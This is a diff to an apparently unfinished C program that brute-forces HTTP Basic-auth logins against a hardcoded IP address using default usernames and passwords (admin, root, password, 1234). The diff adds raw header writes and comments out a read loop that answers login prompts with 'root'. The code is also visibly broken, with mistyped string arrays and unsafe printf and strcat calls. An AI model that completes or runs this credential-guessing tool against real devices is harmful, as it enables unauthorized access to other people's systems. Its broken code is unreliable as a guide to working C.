@@ -47,12 +47,12 @@ char* base64_encode(char* plain) {
 
 
 int main(int argc, char* argv[]) {
-	int sockfd = 0, 
-		n = 0, 
+	int sockfd = 0,
+		n = 0,
 		connPort = 80;
-	struct sockaddr_in 
+	struct sockaddr_in
 		serv_addr;
-	char buff[256], 
+	char buff[1024],
 		connAddr[] = "172.238.141.253";
 
 	// HTTP Headers
@@ -69,22 +69,21 @@ int main(int argc, char* argv[]) {
 		headers_useragent[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\n",
 		headers_host[] = "Host: ", //insert connaddr
 		headers_auth[] = "\nAuthorization: Basic "; //insert base64
-	
+
 	// Credentials
-	char users[5][3] = {
+	char** users[] = {
 		"admin",
 		"root",
 		"Admin"};
-	char passwords[9][6] = {
+	char** passwords[] = {
 		"admin",
 		"password",
 		"1234",
 		"root",
 		"Admin",
 		"12345"};
-	
 
-	memset(buff, '0', sizeof(buff));
+	memset(buff, '\0', sizeof(buff));
 
 	if (setSock(&sockfd) < 0)
 		return 1;
@@ -97,24 +96,45 @@ int main(int argc, char* argv[]) {
 	if (setConn(&sockfd, &serv_addr) < 0)
 		return 1;
 
-	write(sockfd, headers, sizeof(headers));
-	write(sockfd, headers_auth, sizeof(headers));
+	//char lox[] = "";
+	//for (int i = 0; i <= (sizeof(users)/8)-1; ++i) {
+	//	for (int o = 0; o <= (sizeof(passwords)/8)-1; ++o) {
+	//		strcat(lox, users[i]);
+	//		strcat(lox, ":");
+	//		strcat(lox, passwords[o]);
+	//		strcat(lox, "\n");
+	//		printf(lox);
+	//		memset(lox, '\0', sizeof(lox));
+	//	}
+	//}
+
+	char test[] = "123=";
+	write(sockfd, headers_get, sizeof(headers_get));
+	write(sockfd, headers_acceptdata, sizeof(headers_acceptdata));
+	write(sockfd, headers_acceptlang, sizeof(headers_acceptlang));
+	//write(sockfd, headers_acceptdefl, sizeof(headers_acceptdefl));
+	//write(sockfd, headers_acceptencp, sizeof(headers_acceptencp));
+	//write(sockfd, headers_connection, sizeof(headers_connection));
+	write(sockfd, headers_keepalive, sizeof(headers_keepalive));
+	//write(sockfd, headers_cachectrl, sizeof(headers_cachectrl));
+	//write(sockfd, headers_uprginsecreq, sizeof(headers_uprginsecreq));
+	write(sockfd, headers_useragent, sizeof(headers_useragent));
+	write(sockfd, headers_host, sizeof(headers_host));
+	write(sockfd, connAddr, sizeof(connAddr));
+	write(sockfd, test, sizeof(test));
+	write(sockfd, "\n\n", 3);
+
+	printf(buff);
+
+	int first = 0;
 
 	// web part
-	while((n = read(sockfd, buff, sizeof(buff) - 1)) > 0) {
-		buff[n] = 0;
+	//while((n = read(sockfd, buff, sizeof(buff) - 1)) > 0) {
+		//buff[n] = 0;
 
-		//if (test == 1) {
-		//	test = 0;
-		//	write(sockfd, headers, sizeof(headers));
+		//if (strstr(buff,"d") != NULL) {
+		//	write(sockfd, "root\n", 5);
 		//}
-
-		//write(sockfd, "test", 4);
-		//write(sockfd, headers, sizeof(headers));
-
-		if (strstr(buff,"d") != NULL) {
-			write(sockfd, "root\n", 5);
-		}
 
 		//if (strstr(buff,"Password") != NULL) {
 		//	write(sockfd, "admin\n", 6);
@@ -127,8 +147,8 @@ int main(int argc, char* argv[]) {
 
 		// display on screen
 		fputs(buff, stdout);
-		printf("\n");
-	}
+		//printf("\n");
+	//}
 
 	return 0;
 }
